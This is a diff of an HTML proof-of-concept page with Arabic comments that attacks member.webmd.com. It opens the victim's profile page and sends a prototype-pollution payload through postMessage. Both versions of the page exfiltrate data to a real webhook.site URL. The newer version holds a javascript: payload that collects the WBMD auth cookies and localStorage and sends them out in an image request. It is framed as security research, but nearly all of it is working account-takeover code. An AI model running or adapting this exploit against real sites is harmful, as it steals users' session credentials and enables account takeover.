@@ -2,79 +2,69 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Security Research - POC Dashboard</title>
+    <title>WebMD Security Research PoC</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; padding: 40px; text-align: center; }
-        .container { max-width: 800px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); }
-        .status-badge { background: #ef4444; color: white; padding: 5px 15px; border-radius: 20px; font-size: 0.8em; text-transform: uppercase; }
-        #logs { text-align: left; background: #000; padding: 15px; border-radius: 8px; margin-top: 20px; font-family: 'Courier New', Courier, monospace; color: #10b981; height: 200px; overflow-y: auto; }
-        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
-        button:hover { background: #2563eb; }
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
+        #status { margin-top: 20px; color: #666; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Proof of Concept: Prototype Pollution to ATO</h2>
-    <span class="status-badge">Target: member.webmd.com</span>
-    
-    <p>هذه الصفحة تحاكي هجوم "Chaining" بين Open Redirect و Prototype Pollution.</p>
-    
-    <button onclick="launchExploit()">ابدأ استغلال الثغرة (Launch Exploit)</button>
-
-    <div id="logs">
-        <p>> النظام جاهز للبدء...</p>
-    </div>
+<div class="box">
+    <h2>اختبار أمني لثغرة Prototype Pollution</h2>
+    <p>اضغط على الزر أدناه لمحاكاة ضغطة الضحية:</p>
+    <button onclick="startAttack()">مشاهدة العرض (Start Exploit)</button>
+    <div id="status"></div>
 </div>
 
 <script>
-    const webhookURL = "https://webhook.site/6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0";
-    const logger = document.getElementById('logs');
-
-    function log(msg) {
-        const p = document.createElement('p');
-        p.innerText = `> [${new Date().toLocaleTimeString()}] ${msg}`;
-        logger.appendChild(p);
-        logger.scrollTop = logger.scrollHeight;
-    }
-
-    function launchExploit() {
-        log("فتح نافذة الموقع الضحية...");
+    function startAttack() {
+        const status = document.getElementById('status');
+        const myWebhook = "https://webhook.site/6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0";
         
-        // 1. محاكاة الـ Open Redirect (فتح الموقع في نافذة جديدة)
-        // في الهجوم الحقيقي، الضحية يأتي من رابط Redirect رسمي للشركة
-        const victimWin = window.open("https://member.webmd.com/profile", "_blank", "width=800,height=600");
+        status.innerText = "> جاري فتح الموقع الضحية...";
+        
+        // 1. فتح الموقع (الآن سيعمل لأنها داخل دالة مرتبطة بـ Click)
+        const victimWin = window.open("https://member.webmd.com/profile", "_blank");
 
-        log("انتظار تحميل الـ JavaScript في الموقع الضحية (5 ثوانٍ)...");
+        if (!victimWin) {
+            alert("يرجى السماح بالنوافذ المنبثقة (Pop-ups) لهذا الملف!");
+            return;
+        }
 
+        // 2. الانتظار حتى يتم تحميل الموقع
         setTimeout(() => {
-            log("إرسال Payload التلوث لسرقة التوكنات (ATO)...");
-
-            // 2. إرسال السم عبر postMessage
+            status.innerText = "> جاري إرسال السم عبر postMessage...";
+            
             victimWin.postMessage({
                 type: "set-config",
                 data: {
                     "__proto__": {
-                        // الفخ الأول: تغيير رابط الـ API لتوجيه البيانات لسيرفر المهاجم
-                        "apiEndpoint": webhookURL + "/stolen-api",
-                        
-                        // الفخ الثاني: زرع Getter/Setter لاختطاف التوكنات صمتاً
-                        "authToken": "hacked", 
-                        "setAuth": "javascript:new Image().src='" + webhookURL + "/exfil?token='+localStorage.getItem('auth_token')",
-                        
-                        // الفخ الثالث: تزوير هوية المستخدم داخل المتصفح
-                        "UserId": "999999999",
-                        "isAdmin": true
+                        "zipcode": "1337",
+                        "email": "hacked@attacker.com",
+                        "source": `javascript:(function(){
+                            const getCookie = (name) => {
+                                const value = "; " + document.cookie;
+                                const parts = value.split("; " + name + "=");
+                                if (parts.length === 2) return parts.pop().split(";").shift();
+                                return "not_found";
+                            };
+                            const creds = {
+                                auth: getCookie("WBMD_AUTH"),
+                                authp: getCookie("WBMD_AUTHP"),
+                                authc: getCookie("WBMD_AUTHC"),
+                                ls: JSON.stringify(localStorage)
+                            };
+                            new Image().src = "${myWebhook}?stolen=" + btoa(JSON.stringify(creds));
+                        })()`
                     }
                 }
             }, "*");
 
-            log("✅ تم الحقن بنجاح! المتصفح الضحية الآن تحت السيطرة.");
-            log("أي محاولة دخول أو تغيير بيانات سيتم إرسالها للـ Webhook.");
-            
-            // إظهار تنبيه لتأكيد النجاح في الـ PoC
-            alert("Vulnerability Exploited!\nGlobal Prototype Polluted.\nCheck Webhook for incoming data.");
-        }, 5000);
+            status.innerText = "> تم التنفيذ! تحقق من الـ Webhook الآن.";
+        }, 8000); // زدنا الوقت لـ 8 ثوانٍ لضمان التحميل الكامل
     }
 </script>
 
